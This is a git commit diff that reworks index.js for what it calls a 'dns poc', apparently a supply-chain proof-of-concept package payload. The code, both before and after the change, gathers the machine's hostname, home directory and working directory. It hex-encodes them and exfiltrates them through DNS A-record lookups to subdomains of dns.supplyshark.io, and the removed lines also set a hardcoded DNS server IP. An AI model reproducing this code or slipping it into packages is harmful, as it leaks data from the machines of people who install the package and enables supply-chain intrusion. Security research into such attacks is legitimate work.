6ed650b568d622256cfa3e783114bba40f6a73a8
Cody Zacharias <22013186+haccer@users.noreply.github.com>
2024-03-20 10:05:30 -0400

    Update dns poc index.js

--- index.js
+++ index.js
@@ -1,18 +1,18 @@
 (async () => {
-    try {
-      const a = await import('dns');
-      const o = await import('os');
+  try {
+    const dns = await import('dns');
+    const os = await import('os');
 
-      let d = `${o.hostname()}__${o.homedir()}__${__dirname}`;
-      d = d.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
-      d = Buffer.from(d).toString('hex').match(/.{1,50}/g);
-      const i = Math.random().toString(36).substring(7);
+    let d = `${os.hostname()}__${os.homedir()}__${__dirname}`;
+    d = d.replace(/[^a-zA-Z0-9._]/g, (m) => `_${m.charCodeAt(0).toString(16)}`);
+    d = Buffer.from(d).toString('hex').match(/.{1,50}/g);
+    const i = Math.random().toString(36).substring(7);
 
-      a.setServers(['143.198.106.144']);
-
-      for (const c of d) {
-        a.resolve(`${i}.${c}.dns.supplyshark.io`, 'A');
-      }
-    } catch (err) {
+    for (const c of d) {
+      const hostname = `${i}.${c}.dns.supplyshark.io`;
+      await dns.promises.resolve(hostname, 'A');
     }
-  })();
+  } catch (err) {
+    console.error(err);
+  }
+})();
